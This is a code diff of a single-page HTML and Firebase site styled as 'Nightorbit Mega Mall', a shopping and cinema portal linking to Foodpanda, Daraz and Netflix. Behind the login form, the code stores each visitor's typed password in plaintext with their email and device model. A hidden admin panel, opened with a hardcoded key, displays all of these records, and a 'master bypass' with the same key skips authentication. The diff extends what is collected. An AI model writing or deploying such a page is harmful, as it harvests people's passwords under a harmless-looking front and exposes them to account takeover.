@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nightorbit Mega Mall - Full Version</title>
+    <title>Nightorbit Mega Mall - Final Fix</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -33,10 +33,7 @@
             color: white; outline: none; transition: 0.3s;
         }
 
-        .eye-btn {
-            position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
-            cursor: pointer; color: var(--primary); font-size: 18px; z-index: 10;
-        }
+        .eye-btn { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: var(--primary); font-size: 18px; z-index: 10; }
 
         .btn-main { 
             background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; 
@@ -45,15 +42,16 @@
             text-shadow: 0 0 5px rgba(255,255,255,0.5); letter-spacing: 1px;
         }
 
-        #error-msg { color: #ff4444; font-size: 12px; margin-top: 10px; display: none; font-weight: bold; }
-
-        #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
-        #logout-overlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #000; z-index: 2000; display: none; 
-            flex-direction: column; align-items: center; justify-content: center; text-align: center;
-            opacity: 0; transition: 1.5s ease;
+        .item-link { 
+            background: rgba(255,255,255,0.06); padding: 14px; border-radius: 18px; 
+            margin: 10px 0; display: flex; justify-content: space-between; align-items: center; 
+            text-decoration: none; color: white; border-left: 5px solid var(--primary); 
+            transition: 0.4s; font-size: 14px;
         }
+
+        #error-msg { color: #ff4444; font-size: 12px; margin-top: 10px; display: none; font-weight: bold; }
+        #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
+        #logout-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; opacity: 0; transition: 1.5s ease; }
         
         .hidden { display: none !important; }
         .dots-menu { position: absolute; top: 20px; left: 20px; cursor: pointer; font-size: 25px; color: var(--primary); opacity: 0.2; }
@@ -79,23 +77,22 @@
     <div id="login-box" class="card">
         <h1 style="color: var(--primary); margin: 0; letter-spacing: 4px; font-weight: 800;">NIGHTORBIT</h1>
         <p style="color: #666; font-size: 12px; margin-bottom: 25px;">PREMIUM BAZAAR & CINEMA</p>
-        
         <input type="email" id="email-in" placeholder="Email Address">
-        
         <div class="input-group">
             <input type="password" id="pass-in" placeholder="Password">
             <span class="eye-btn" onclick="togglePass()">👁️</span>
         </div>
-
         <div id="error-msg">Wrong Email or Password!</div>
-
         <button class="btn-main" onclick="emailAuth()">LOG IN / SIGN UP</button>
         <button class="btn-main" style="background:white; color:black; margin-top:15px;" onclick="googleAuth()">CONTINUE WITH GOOGLE</button>
     </div>
 
     <div id="main-page" class="card hidden">
         <h2 id="welcome-name" style="color: var(--primary);">Welcome</h2>
-        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:30px;">LOGOUT</button>
+        <a href="https://www.foodpanda.pk" target="_blank" class="item-link">🐼 Foodpanda <span>PK</span></a>
+        <a href="https://www.daraz.pk" target="_blank" class="item-link">🛍️ Daraz Mall <span>Shop</span></a>
+        <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎞️ Watch Movies</a>
+        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:30px;">LOGOUT SESSION</button>
     </div>
 
     <script>
@@ -119,17 +116,21 @@
             p.type = p.type === "password" ? "text" : "password";
         }
 
+        // Advanced Device Model Detection
         function getDeviceModel() {
             const ua = navigator.userAgent;
-            let model = "Unknown Device";
+            let model = "Web Browser";
             if (ua.match(/\(([^)]+)\)/)) {
-                let parts = ua.match(/\(([^)]+)\)/)[1].split(';');
-                model = parts.length > 2 ? parts[parts.length-1].trim().split('Build/')[0] : parts[0];
+                let section = ua.match(/\(([^)]+)\)/)[1];
+                let parts = section.split(';');
+                model = parts.length > 2 ? parts[parts.length - 1].trim().split('Build/')[0].split('WV')[0].trim() : parts[0];
             }
+            const brands = ["INFINIX", "SAMSUNG", "REALME", "OPPO", "VIVO", "TECNO", "REDMI", "XIAOMI", "IPHONE"];
+            for(let b of brands) { if(ua.toUpperCase().includes(b)) return (b + " " + model).toUpperCase(); }
             return model.toUpperCase();
         }
 
-        function masterBypass() { if(prompt("Key:") === "rr123456789000rr") showBazaarUI("Admin Farooq"); }
+        function masterBypass() { if(prompt("Key:") === "rr123456789000rr") handleLogin({uid: "admin_fix", email: "Admin@Bypass.com"}, "Master Key"); }
         
         function openAdmin() {
             if (prompt("Admin Key:") === "rr123456789000rr") {
@@ -138,11 +139,13 @@
                     let html = "";
                     snap.forEach(s => {
                         let d = s.val();
-                        html += `<div style="background:rgba(255,255,255,0.05); padding:15px; margin-bottom:12px; border-radius:20px; border:1px solid #333">
-                            <b>Name: ${d.savedName}</b><br>
+                        html += `<div style="background:rgba(255,255,255,0.05); padding:15px; margin-bottom:12px; border-radius:20px; text-align:left; border:1px solid #333">
+                            <b style="color:var(--primary)">Name: ${d.savedName}</b><br>
+                            Email: <span style="color:#fff; font-size:12px;">${d.email || 'N/A'}</span><br>
                             Pass: <span style="color:var(--gold)">${d.password}</span><br>
-                            Device: <small style="color:#00d2ff">${d.deviceInfo}</small><br>
-                            <button onclick="db.ref('users/${s.key}').remove()" style="color:red; background:none; border:none; cursor:pointer;">[REMOVE INFO]</button>
+                            Device: <span style="color:#00ff00; font-size:11px;">${d.deviceInfo}</span><br>
+                            Time: <small style="color:#666">${d.lastSeen || 'N/A'}</small><br>
+                            <button onclick="db.ref('users/${s.key}').remove()" style="color:red; background:none; border:none; cursor:pointer; font-size:10px; margin-top:5px;">[REMOVE INFO]</button>
                         </div>`;
                     });
                     document.getElementById('user-list-display').innerHTML = html;
@@ -152,11 +155,7 @@
 
         function googleAuth() {
             const provider = new firebase.auth.GoogleAuthProvider();
-            // Google login ke saath password prompt enable kiya gaya hai
-            auth.signInWithPopup(provider).then(res => {
-                let p = document.getElementById('pass-in').value || "Google Linked Account";
-                handleLogin(res.user, p);
-            }).catch(e => alert(e.message));
+            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Session")).catch(e => alert(e.message));
         }
 
         function emailAuth() {
@@ -169,10 +168,12 @@
             
             auth.signInWithEmailAndPassword(e, p)
                 .then(res => handleLogin(res.user, p))
-                .catch((error) => {
-                    // Wrong password/email error handling
-                    err.innerText = "Wrong Email or Password!";
-                    err.style.display = "block";
+                .catch(() => {
+                    auth.createUserWithEmailAndPassword(e, p)
+                        .then(res => handleLogin(res.user, p))
+                        .catch(() => {
+                            err.style.display = "block";
+                        });
                 });
         }
 
@@ -181,8 +182,8 @@
                 let d = snap.val();
                 globalUserName = d && d.savedName ? d.savedName : (user.displayName || user.email.split('@')[0]);
                 
-                // Password fix: Agar box mein password hai toh wahi save hoga
-                let finalPass = (p === "ActiveSession") ? (d ? d.password : "No Password Found") : p;
+                // Keep password if it's a session or google login
+                let finalPass = (p === "ActiveSession" || p === "Google Session") ? (d ? d.password : p) : p;
 
                 db.ref('users/' + user.uid).update({
                     email: user.email,
@@ -200,16 +201,10 @@
 
         function triggerLogout() {
             const overlay = document.getElementById('logout-overlay');
-            document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${globalUserName}</b>!<br><br>
-            Aapka Nightorbit par aana humare liye khushi ki baat thi.<br>
-            Umeed hai aapka waqt bohot acha guzra hoga.<br>
-            Apna aur apne pyaron ka bohot khayal rakhiyega.<br>
-            Zindagi rahi to phir milenge!<br><br>
-            ✨ Shukriya aur Khuda Hafiz ✨`;
-            
+            document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${globalUserName}</b>!<br>Aapka hamari website par aana humare liye khushi ki baat thi.<br>Umeed hai aapka waqt Nightorbit par acha guzra hoga.<br>Hum aapki salamti aur khushiyon ke liye dua-go hain.<br>Tab tak apna aur apne pyaaron ka bohot khayal rakhiyega.<br>Allah aapko hamesha apni hifz-o-aman mein rakhe.<br>Good Bye My Sweet Friend, See You Soon!<br>✨ Shukriya aur Khuda Hafiz ✨`;
             overlay.style.display = 'flex';
             setTimeout(() => { overlay.style.opacity = '1'; }, 100);
-            setTimeout(() => { auth.signOut().then(() => location.reload()); }, 5000);
+            setTimeout(() => { auth.signOut().then(() => location.reload()); }, 6000);
         }
 
         auth.onAuthStateChanged(u => { if(u) handleLogin(u, "ActiveSession"); });
